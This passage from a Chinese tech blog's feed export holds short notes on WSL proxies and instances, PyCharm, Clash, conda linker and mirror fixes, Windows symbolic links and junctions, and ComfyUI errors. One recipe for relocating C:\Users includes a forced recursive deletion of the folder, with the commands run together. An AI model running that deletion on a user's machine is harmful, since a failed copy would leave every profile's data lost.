title="（1）设置 Windows 系统代理"></a>（1）设置 Windows 系统代理</h4><p>如果使用科学上网工具（如 Clash、V2Ray、VPN），确保系统代理已启用。可在 Windows 设置 → 网络和 Internet → 代理中配置，也可以通过命令设置环境变量：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">setx http_proxy http://127.0.0.1:7890 /msetx https_proxy http://127.0.0.1:7890 /m<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="（2）在-WSL-中设置代理"><a href="#（2）在-WSL-中设置代理" class="headerlink" title="（2）在 WSL 中设置代理"></a>（2）在 WSL 中设置代理</h4><p>在 WSL 中使用环境变量：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">export</span> <span class="token assign-left variable">http_proxy</span><span class="token operator">=</span><span class="token string">"http://127.0.0.1:7890"</span><span class="token builtin class-name">export</span> <span class="token assign-left variable">https_proxy</span><span class="token operator">=</span><span class="token string">"http://127.0.0.1:7890"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>若需要全局生效，在 <code>~/.bashrc</code> 或 <code>~/.zshrc</code> 文件末尾加入以上配置，并执行 <code>source ~/.bashrc</code> 使其生效。</p><h4 id="（3）apt-专用代理配置"><a href="#（3）apt-专用代理配置" class="headerlink" title="（3）apt 专用代理配置"></a>（3）apt 专用代理配置</h4><p>创建或编辑 apt 配置文件：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">nano</span> /etc/apt/apt.conf.d/proxy.conf<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>添加内容：</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp">Acquire<span class="token double-colon punctuation">::</span>http<span class="token double-colon punctuation">::</span>Proxy <span class="token string">"http://127.0.0.1:7890"</span><span class="token punctuation">;</span>Acquire<span class="token double-colon punctuation">::</span>https<span class="token double-colon punctuation">::</span>Proxy <span class="token string">"http://127.0.0.1:7890"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>保存后，<code>sudo apt update</code> 将走代理。</p><h3 id="5-4-多实例安装（同一版本多个副本）"><a href="#5-4-多实例安装（同一版本多个副本）" class="headerlink" title="5.4 多实例安装（同一版本多个副本）"></a>5.4 多实例安装（同一版本多个副本）</h3><p>WSL 允许你导入同一 Linux 发行版的多个副本，便于隔离不同任务。操作步骤如下：</p><ol><li><p><strong>导出已有实例</strong><br> 假设已安装 <code>Ubuntu-20.04</code>，用以下命令导出为 <code>.tar</code> 文件：</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">wsl <span class="token operator">--</span>export Ubuntu-20<span class="token punctuation">.</span>04 D:\wsl-backups\ubuntu-20<span class="token punctuation">.</span>04<span class="token punctuation">.</span>tar<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p><strong>导入为新实例</strong><br> 用新名称（例如 <code>Ubuntu-Dev</code>）创建副本：</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">wsl <span class="token operator">--</span>import Ubuntu-Dev D:\WSL\Ubuntu-Dev D:\wsl-backups\ubuntu-20<span class="token punctuation">.</span>04<span class="token punctuation">.</span>tar <span class="token operator">--</span>version 2<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p><strong>启动新实例</strong><br> 使用下面命令启动新导入的实例：</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">wsl <span class="token operator">-</span>d Ubuntu-Dev<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ol><p>这样你就可以在同一台机器上同时运行多个独立的 Linux 环境。</p><hr><h2 id="6-常用命令与管理技巧"><a href="#6-常用命令与管理技巧" class="headerlink" title="6. 常用命令与管理技巧"></a>6. 常用命令与管理技巧</h2><ul><li><p><strong>查看已安装发行版及版本</strong>：</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">wsl <span class="token operator">-</span>l <span class="token operator">-</span>v<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p><strong>启动指定发行版</strong>：</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">wsl <span class="token operator">-</span>d &lt;发行版名称&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p><strong>设置默认发行版（直接运行 wsl 时启动的系统）</strong>：</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">wsl <span class="token operator">--</span>setdefault &lt;发行版名称&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p><strong>切换 WSL 版本</strong>：</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">wsl <span class="token operator">--</span><span class="token function">set-version</span> &lt;发行版名称&gt; <span class="token punctuation">[</span>1<span class="token punctuation">|</span>2<span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p><strong>更新 WSL 内核</strong>：</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">wsl <span class="token operator">--</span>update<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p><strong>关闭所有运行中的 WSL 实例</strong>：</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">wsl <span class="token operator">--</span>shutdown<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p><strong>卸载某个发行版</strong>：</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">wsl <span class="token operator">--</span>unregister &lt;发行版名称&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ul>]]></content>
      
      
      <categories>
          
          <category> 教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pycharm保存许可证数据时出错</title>
      <link href="/2025/04/08/pycharm-bao-cun-xu-ke-zheng-shu-ju-shi-chu-cuo/"/>
      <url>/2025/04/08/pycharm-bao-cun-xu-ke-zheng-shu-ju-shi-chu-cuo/</url>
      
        <content type="html"><![CDATA[<h1 id="pycharm保存许可证数据时出错"><a href="#pycharm保存许可证数据时出错" class="headerlink" title="pycharm保存许可证数据时出错"></a>pycharm保存许可证数据时出错</h1><p>报错</p><p> C:\Users\xxx\AppData\Roaming\JetBrains\PyCharm2024.2\pycharm.key (拒绝访问)</p><p>去这个目录下把这个文件改成<code>pycharm.key.bak</code>做一个备份，然后新建一个文件空<code>pycharm.key</code>，不创建好像也能自己创建，我没试过</p>]]></content>
      
      
      <categories>
          
          <category> 报错修复 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tools </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Google内容在新标签页打开</title>
      <link href="/2025/04/07/google-nei-rong-zai-xin-biao-qian-ye-da-kai/"/>
      <url>/2025/04/07/google-nei-rong-zai-xin-biao-qian-ye-da-kai/</url>
      
        <content type="html"><![CDATA[<h1 id="Google内容在新标签页打开"><a href="#Google内容在新标签页打开" class="headerlink" title="Google内容在新标签页打开"></a>Google内容在新标签页打开</h1><p>进入<code>google.com</code>，右下角找到设置，搜索设置，找到在新的浏览器窗口中打开所选的每条搜索结果勾选</p>]]></content>
      
      
      <categories>
          
          <category> tips </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tips </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>clash_verge节点全部超时</title>
      <link href="/2025/04/05/clash-verge-jie-dian-quan-bu-chao-shi/"/>
      <url>/2025/04/05/clash-verge-jie-dian-quan-bu-chao-shi/</url>
      
        <content type="html"><![CDATA[<h1 id="clash-verge节点全部超时"><a href="#clash-verge节点全部超时" class="headerlink" title="clash_verge节点全部超时"></a>clash_verge节点全部超时</h1><p>clash_verge正常使用需要确保本地计算机系统时间与服务器上是一致，如果存在一定时差会导致全部服务器连接超时，一般都是标准北京时间可以到系统的 “日期和时间” 设置中同步一下标准时间。</p><p>或者</p><p>关闭DNS，到设置-&gt;DNS覆写-&gt;关闭DNS</p>]]></content>
      
      
      <categories>
          
          <category> 报错修复 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> wall </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>解决报错jinja2.exceptions.TemplateNotFound_index.html</title>
      <link href="/2025/04/03/jie-jue-bao-cuo-jinja2.exceptions.templatenotfound-index.html/"/>
      <url>/2025/04/03/jie-jue-bao-cuo-jinja2.exceptions.templatenotfound-index.html/</url>
      
        <content type="html"><![CDATA[<h1 id="解决报错jinja2-exceptions-TemplateNotFound-index-html"><a href="#解决报错jinja2-exceptions-TemplateNotFound-index-html" class="headerlink" title="解决报错jinja2.exceptions.TemplateNotFound_index.html"></a>解决报错jinja2.exceptions.TemplateNotFound_index.html</h1><p>templates文件夹需要和xxx.py需要再一级文件夹</p>]]></content>
      
      
      <categories>
          
          <category> 报错修复 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>编译时报错rootminiconda3compiler_compatld</title>
      <link href="/2025/03/24/bian-yi-shi-bao-cuo-rootminiconda3compiler-compatld/"/>
      <url>/2025/03/24/bian-yi-shi-bao-cuo-rootminiconda3compiler-compatld/</url>
      
        <content type="html"><![CDATA[<h1 id="编译时报错rootminiconda3compiler-compatld"><a href="#编译时报错rootminiconda3compiler-compatld" class="headerlink" title="编译时报错rootminiconda3compiler_compatld"></a>编译时报错rootminiconda3compiler_compatld</h1><h2 id="报错描述"><a href="#报错描述" class="headerlink" title="报错描述"></a>报错描述</h2><p>在执行make安装编译时报错</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">/root/miniconda3/compiler_compat/ld: cannot <span class="token function">find</span> -lpbc: No such <span class="token function">file</span> or directory<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h2><p>这个是由于conda环境自带有编译库，你安装的库可能没有</p><h4 id="方法-1：退出-Conda-环境"><a href="#方法-1：退出-Conda-环境" class="headerlink" title="方法 1：退出 Conda 环境"></a><strong>方法 1：退出 Conda 环境</strong></h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">conda deactivate  <span class="token comment"># 确保编译时不在 Conda 环境中</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>退出 Conda 环境后，编译工具链会直接使用系统的 <code>ld</code> 和库路径。</p><h4 id="方法-2：手动指定链接器路径"><a href="#方法-2：手动指定链接器路径" class="headerlink" title="方法 2：手动指定链接器路径"></a><strong>方法 2：手动指定链接器路径</strong></h4><p>在编译命令中强制使用系统链接器（覆盖 Conda 的默认设置）：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 示例：在编译时指定系统 ld</span>gcc <span class="token punctuation">..</span>. -B/usr/bin <span class="token punctuation">..</span>.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>或直接调用系统链接器：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">/usr/bin/ld <span class="token punctuation">..</span>.<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="方法-3：临时移除-Conda-的干扰"><a href="#方法-3：临时移除-Conda-的干扰" class="headerlink" title="方法 3：临时移除 Conda 的干扰"></a><strong>方法 3：临时移除 Conda 的干扰</strong></h4><p>重命名或删除 <code>compiler_compat</code> 目录（需谨慎操作）：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">mv</span> /root/miniconda3/compiler_compat /root/miniconda3/compiler_compat.bak<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>操作后重新编译，但可能影响 Conda 环境内其他包的编译行为。</p><hr><h3 id="验证当前使用的-ld"><a href="#验证当前使用的-ld" class="headerlink" title="验证当前使用的 ld"></a><strong>验证当前使用的 <code>ld</code></strong></h3><p>检查编译时实际调用的 <code>ld</code> 路径：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 查看编译过程中使用的 ld 路径</span>gcc <span class="token parameter variable">-v</span> <span class="token punctuation">..</span>. <span class="token operator"><span class="token file-descriptor important">2</span>&gt;</span><span class="token file-descriptor important">&amp;1</span> <span class="token operator">|</span> <span class="token function">grep</span> COLLECT_LTO_WRAPPER<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 报错修复 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>文件链接全教程</title>
      <link href="/2025/03/12/wen-jian-lian-jie-quan-jiao-cheng/"/>
      <url>/2025/03/12/wen-jian-lian-jie-quan-jiao-cheng/</url>
      
        <content type="html"><![CDATA[<h1 id="文件链接全教程"><a href="#文件链接全教程" class="headerlink" title="文件链接全教程"></a>文件链接全教程</h1><h2 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h2><h3 id="1-链接基础概念"><a href="#1-链接基础概念" class="headerlink" title="1. 链接基础概念"></a>1. 链接基础概念</h3><p>在 Windows 中，“链接”实际上有几种形式，主要包括以下几类：</p><ul><li>符号链接（Symbolic Link，软链接）<ul><li><strong>概念：</strong> 符号链接是一个特殊文件，其中保存了目标文件或目录的路径。它类似于 Linux 中的软链接，并且看起来和普通文件或文件夹没有区别。</li><li>特点：<ul><li>可用于文件和目录</li><li>可以跨分区甚至跨网络路径（UNC）</li><li>如果目标被删除或移动，符号链接会失效</li><li>从 Windows Vista 开始支持，最新 Windows（如 Windows 10/11）中在开发人员模式下可不需要管理员权限创建</li></ul></li></ul></li><li>硬链接（Hard Link）<ul><li><strong>概念：</strong> 硬链接是指向同一数据实体（数据块或 NTFS 中的文件记录）的另一个目录项。每个硬链接都与目标文件共享同一份数据。</li><li>特点：<ul><li>仅适用于文件，不能用于目录</li><li>必须在同一 NTFS 卷内（不能跨分区）</li><li>删除其中一个链接不会影响其它链接或数据本身，只有当所有硬链接都删除后数据才会释放</li></ul></li></ul></li><li>目录联接（Junction Point）<ul><li><strong>概念：</strong> 目录联接也称为“联接”，用于将一个目录指向另一个目录。在早期版本中常用来兼容旧版 Windows。</li><li>特点：<ul><li>只适用于目录</li><li>创建时会自动转换为绝对路径</li><li>适用于同一台计算机，支持跨盘符（但不支持网络路径）</li></ul></li></ul></li></ul><hr><h3 id="2-创建链接的方法"><a href="#2-创建链接的方法" class="headerlink" title="2. 创建链接的方法"></a>2. 创建链接的方法</h3><p>在 Windows 中创建链接主要有两种方式：通过 CMD 命令行（使用 <code>mklink</code> 命令）和通过 PowerShell（使用 <code>New-Item</code> 命令）。</p><h4 id="2-1-使用-CMD-命令创建链接"><a href="#2-1-使用-CMD-命令创建链接" class="headerlink" title="2.1 使用 CMD 命令创建链接"></a>2.1 使用 CMD 命令创建链接</h4><p><strong>命令语法：</strong></p><pre class="line-numbers language-cmd" data-language="cmd"><code class="language-cmd">mklink [[/D] | [/H] | [/J]] Link Target<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li><strong>默认（无参数）</strong>：创建文件的符号链接</li><li><strong>/D</strong>：创建目录的符号链接</li><li><strong>/H</strong>：创建硬链接（仅用于文件）</li><li><strong>/J</strong>：创建目录联接（Junction，适用于目录）</li></ul><p><strong>示例：</strong></p><ol><li><p><strong>创建文件的符号链接</strong><br> 假设有一个文件 <code>C:\Data\original.txt</code>，我们在同目录下创建一个名为 <code>link.txt</code> 的符号链接：</p><pre class="line-numbers language-cmd" data-language="cmd"><code class="language-cmd">mklink C:\Data\link.txt C:\Data\original.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>此时，<code>link.txt</code> 实际上保存了 <code>original.txt</code> 的路径，当你打开 <code>link.txt</code> 时，系统会自动访问 <code>original.txt</code>。</p></li><li><p><strong>创建目录的符号链接</strong><br> 假设有一个目录 <code>C:\Data\SourceFolder</code>，希望在 <code>C:\Data</code> 下创建一个符号链接目录 <code>LinkFolder</code>：</p><pre class="line-numbers language-cmd" data-language="cmd"><code class="language-cmd">mklink /D C:\Data\LinkFolder C:\Data\SourceFolder<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这样，在资源管理器中打开 <code>LinkFolder</code> 就等同于打开 <code>SourceFolder</code>。</p></li><li><p><strong>创建文件的硬链接</strong><br> 依然以文件 <code>C:\Data\original.txt</code> 为例，创建一个硬链接 <code>hardlink.txt</code>：</p><pre class="line-numbers language-cmd" data-language="cmd"><code class="language-cmd">mklink /H C:\Data\hardlink.txt C:\Data\original.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>硬链接与原文件共享同一数据块，因此修改任一文件都会同步改变内容，但请注意：</p><ul><li>硬链接只能用于文件</li><li>必须在同一卷内</li></ul></li><li><p><strong>创建目录联接（Junction）</strong><br> 使用 /J 参数来创建目录联接，适用于目录，但和符号链接不同的是，Junction 通常保存绝对路径：</p><pre class="line-numbers language-cmd" data-language="cmd"><code class="language-cmd">mklink /J C:\Data\JunctionFolder C:\Data\SourceFolder<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>使用 Junction 时，删除链接不会删除目标目录中的数据。</p></li></ol><p><em>注意：</em></p><ul><li>创建符号链接和某些操作可能需要以<strong>管理员身份</strong>运行 CMD。</li><li>Windows 10 及以后版本如果开启“开发人员模式”，可以允许普通用户创建符号链接。</li></ul><hr><h4 id="2-2-使用-PowerShell-创建链接"><a href="#2-2-使用-PowerShell-创建链接" class="headerlink" title="2.2 使用 PowerShell 创建链接"></a>2.2 使用 PowerShell 创建链接</h4><p>PowerShell 提供了更现代的 <code>New-Item</code> 命令来创建不同类型的链接。</p><p><strong>语法及示例：</strong></p><ol><li><p><strong>创建文件或目录的符号链接：</strong></p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token function">New-Item</span> <span class="token operator">-</span>ItemType SymbolicLink <span class="token operator">-</span>Path <span class="token string">"C:\Data\Link.txt"</span> <span class="token operator">-</span>Target <span class="token string">"C:\Data\original.txt"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>或者创建目录符号链接：</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token function">New-Item</span> <span class="token operator">-</span>ItemType SymbolicLink <span class="token operator">-</span>Path <span class="token string">"C:\Data\LinkFolder"</span> <span class="token operator">-</span>Target <span class="token string">"C:\Data\SourceFolder"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>PowerShell 中的 <code>SymbolicLink</code> 同样创建的是软链接，和 CMD 中 <code>mklink</code> 默认行为一致。</p></li><li><p><strong>创建文件的硬链接：</strong></p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token function">New-Item</span> <span class="token operator">-</span>ItemType HardLink <span class="token operator">-</span>Path <span class="token string">"C:\Data\hardlink.txt"</span> <span class="token operator">-</span>Target <span class="token string">"C:\Data\original.txt"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这会为 <code>original.txt</code> 创建一个硬链接，注意硬链接只能用于文件，且必须在同一卷内。</p></li><li><p><strong>创建目录联接（Junction）：</strong></p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token function">New-Item</span> <span class="token operator">-</span>ItemType Junction <span class="token operator">-</span>Path <span class="token string">"C:\Data\JunctionFolder"</span> <span class="token operator">-</span>Target <span class="token string">"C:\Data\SourceFolder"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>此命令会创建一个指向目录的联接，与符号链接在某些场景下效果类似，但内部处理略有差异。</p></li></ol><p><em>提示：</em></p><ul><li>PowerShell 命令执行时也可能需要管理员权限，具体取决于目标路径所在的位置（例如系统文件夹或 Program Files）。</li><li>在使用相对路径创建符号链接时，系统会将其转换为绝对路径存储在 NTFS 中。</li></ul><hr><h3 id="3-使用场景与注意事项"><a href="#3-使用场景与注意事项" class="headerlink" title="3. 使用场景与注意事项"></a>3. 使用场景与注意事项</h3><h4 id="3-1-常见使用场景"><a href="#3-1-常见使用场景" class="headerlink" title="3.1 常见使用场景"></a>3.1 常见使用场景</h4><ul><li><p><strong>数据备份和增量备份</strong><br> 利用硬链接可以在不占用额外磁盘空间的情况下创建多个访问入口。例如，备份软件（如 Windows 版的“时间机器”）就会使用硬链接来实现增量备份。</p></li><li><p><strong>移动或重定向系统目录</strong><br> 为了节省系统盘空间或实现重装系统不丢失用户数据，可以将如 <code>C:\Users</code> 目录复制到其他分区，然后使用 Junction 将原位置重定向到新位置：</p><pre class="line-numbers language-cmd" data-language="cmd"><code class="language-cmd">robocopy "C:\Users" "D:\Users" /E /COPYALL /XJrmdir "C:\Users" /S /Qmklink /J "C:\Users" "D:\Users"<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li><li><p><strong>开发环境下共享资源</strong><br> 当多个项目需要使用同一份库或模型文件时，可以通过符号链接或硬链接共享文件，避免重复存储。</p></li></ul><h4 id="3-2-注意事项"><a href="#3-2-注意事项" class="headerlink" title="3.2 注意事项"></a>3.2 注意事项</h4><ul><li><p><strong>权限问题</strong></p><ul><li>在 Windows 中，创建符号链接通常需要管理员权限；不过在 Windows 10 开发人员模式下可允许普通用户创建符号链接。</li><li>硬链接不需要额外的权限，但目标文件必须在同一 NTFS 卷内。</li></ul></li><li><p><strong>目标失效风险</strong></p><ul><li>符号链接依赖于目标路径。如果目标移动或删除，符号链接会成为“悬挂链接”（无效链接）。</li><li>硬链接与目标数据直接关联，即使原始文件名被删除，只要至少还有一个硬链接存在，数据依然可用。</li></ul></li><li><p><strong>跨分区限制</strong></p><ul><li>硬链接只能在同一卷内使用，而符号链接和 Junction 则可以跨卷（但符号链接可以支持网络路径，而 Junction 则不行）。</li></ul></li><li><p><strong>命令使用环境</strong></p><ul><li>使用 <code>mklink</code> 命令时建议打开<strong>管理员命令提示符</strong>。</li><li>使用 PowerShell 时，若涉及系统目录或受保护区域，建议以管理员身份运行 PowerShell。</li></ul></li><li><p>查看链接和删除</p><p>直接在资源管理器操作</p></li></ul><h2 id="linux"><a href="#linux" class="headerlink" title="linux"></a>linux</h2><p><a href="https://0xdadream.github.io/2025/02/20/arc-zai-comfyui-bao-cuo/">Arc在comfyui报错 | 逐梦</a></p>]]></content>
      
      
      <categories>
          
          <category> 教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 命令 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>comfyui报错huggingface</title>
      <link href="/2025/03/09/comfyui-bao-cuo-huggingface/"/>
      <url>/2025/03/09/comfyui-bao-cuo-huggingface/</url>
      
        <content type="html"><![CDATA[<h1 id="comfyui报错huggingface"><a href="#comfyui报错huggingface" class="headerlink" title="comfyui报错huggingface"></a>comfyui报错huggingface</h1><p>报错信息</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">huggingface_hub.errors.LocalEntryNotFoundError: An error happened <span class="token keyword">while</span> trying to <span class="token function">locate</span> the <span class="token function">file</span> on the Hub and we cannot <span class="token function">find</span> the requested files <span class="token keyword">in</span> the <span class="token builtin class-name">local</span> cache. Please check your connection and try again or <span class="token function">make</span> sure your Internet connection is on.<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>解决方法</p><p>到<code>main.py</code>代码前面添加</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">os<span class="token punctuation">.</span>environ<span class="token punctuation">[</span><span class="token string">"HF_ENDPOINT"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"https://hf-mirror.com"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>换镜像</p>]]></content>
      
      
      <categories>
          
          <category> 报错修复 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> comfyui </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pycharm显示显示表格</title>
      <link href="/2025/02/21/pycharm-xian-shi-xian-shi-biao-ge/"/>
      <url>/2025/02/21/pycharm-xian-shi-xian-shi-biao-ge/</url>
      
        <content type="html"><![CDATA[<h1 id="pycharm显示显示表格"><a href="#pycharm显示显示表格" class="headerlink" title="pycharm显示显示表格"></a>pycharm显示显示表格</h1><p>当以pycharm打开<code>.csv</code>文件时，可能不能显示表格，在文件中右键，选择关联文件，找到csv关联即可</p>]]></content>
      
      
      <categories>
          
          <category> 教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Arc在comfyui报错</title>
      <link href="/2025/02/20/arc-zai-comfyui-bao-cuo/"/>
      <url>/2025/02/20/arc-zai-comfyui-bao-cuo/</url>
      
        <content type="html"><![CDATA[<h1 id="Arc在comfyui报错"><a href="#Arc在comfyui报错" class="headerlink" title="Arc在comfyui报错"></a>Arc在comfyui报错</h1><h2 id="报错"><a href="#报错" class="headerlink" title="报错"></a>报错</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Current platform can NOT allocate memory block with size larger than 4GB<span class="token operator">!</span> Tried to allocate <span class="token number">8.00</span> GiB <span class="token punctuation">(</span>GPU <span class="token number">0</span><span class="token punctuation">;</span> <span class="token number">15.56</span> GiB total capacity<span class="token punctuation">;</span> <span class="token number">2.08</span> GiB already allocated<span class="token punctuation">;</span> <span class="token number">2.12</span> GiB reserved <span class="token keyword">in</span> total by PyTorch<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>目前的解决办法都不太行，我的做法是回到<code>IPEX-2.1</code>版本</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://github.com/intel/intel-extension-for-pytorch/issues/325#issuecomment-2604803076">Arrays larger than 4 GB crashes · Issue #325 · intel/intel-extension-for-pytorch</a></p>]]></content>
      
      
      <categories>
          
          <category> 报错修复 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> intel </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>conda换源</title>
      <link href="/2025/02/19/conda-huan-yuan/"/>
      <url>/2025/02/19/conda-huan-yuan/</url>
      
        <content type="html"><![CDATA[<h1 id="conda换源"><a href="#conda换源" class="headerlink" title="conda换源"></a>conda换源</h1><p>由于网络连接原因，使用 Anaconda 或 Miniconda 时，默认的官方源速度较慢。为提高下载速度，您可以将 Conda 的源更换为国内的镜像源。以下是详细的操作步骤：</p><p><strong>1. 生成 <code>.condarc</code> 配置文件：</strong></p><p>在 Windows 系统中，用户目录下可能没有 <code>.condarc</code> 文件。您可以通过以下命令生成该文件：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">conda config <span class="token parameter variable">--set</span> show_channel_urls <span class="token function">yes</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>执行后，<code>.condarc</code> 文件将被创建在用户主目录下。在 Windows 上，用户主目录通常位于 <code>C:\Users\用户名\</code>。</p><p><strong>2. 编辑 <code>.condarc</code> 文件：</strong></p><p>使用文本编辑器打开 <code>.condarc</code> 文件，将其内容替换为以下内容：</p><pre class="line-numbers language-yaml" data-language="yaml"><code class="language-yaml"><span class="token key atrule">channels</span><span class="token punctuation">:</span>  <span class="token punctuation">-</span> defaults<span class="token key atrule">show_channel_urls</span><span class="token punctuation">:</span> <span class="token boolean important">true</span><span class="token key atrule">default_channels</span><span class="token punctuation">:</span>  <span class="token punctuation">-</span> https<span class="token punctuation">:</span>//mirrors.bfsu.edu.cn/anaconda/pkgs/main  <span class="token punctuation">-</span> https<span class="token punctuation">:</span>//mirrors.bfsu.edu.cn/anaconda/pkgs/r  <span class="token punctuation">-</span> https<span class="token punctuation">:</span>//mirrors.bfsu.edu.cn/anaconda/pkgs/msys2<span class="token key atrule">custom_channels</span><span class="token punctuation">:</span>  <span class="token key atrule">conda-forge</span><span class="token punctuation">:</span> https<span class="token punctuation">:</span>//mirrors.bfsu.edu.cn/anaconda/cloud  <span class="token key atrule">msys2</span><span class="token punctuation">:</span> https<span class="token punctuation">:</span>//mirrors.bfsu.edu.cn/anaconda/cloud  <span class="token key atrule">bioconda</span><span class="token punctuation">:</span> https<span class="token punctuation">:</span>//mirrors.bfsu.edu.cn/anaconda/cloud  <span class="token key atrule">menpo</span><span class="token punctuation">:</span> https<span class="token punctuation">:</span>//mirrors.bfsu.edu.cn/anaconda/cloud  <span class="token key atrule">pytorch</span><span class="token punctuation">:</span> https<span class="token punctuation">:</span>//mirrors.bfsu.edu.cn/anaconda/cloud  <span class="token key atrule">pytorch-lts</span><span class="token punctuation">:</span> https<span class="token punctuation">:</span>//mirrors.bfsu.edu.cn/anaconda/cloud  <span class="token key atrule">simpleitk</span><span class="token punctuation">:</span> https<span class="token punctuation">:</span>//mirrors.bfsu.edu.cn/anaconda/cloud<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>上述配置将 Conda 的源更换为北京外国语大学的镜像站。您也可以选择其他国内镜像源，如清华大学、上海交通大学等。具体的镜像源配置可以参考清华大学开源软件镜像站的官方文档。 </p><p><a href="https://mirrors.tuna.tsinghua.edu.cn/help/anaconda/?utm_source=chatgpt.com">mirrors.tuna.tsinghua.edu.cn</a></p><p><strong>3. 清理索引缓存：</strong></p><p>更换源后，建议清理 Conda 的索引缓存，以确保使用新的镜像源：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">conda clean <span class="token parameter 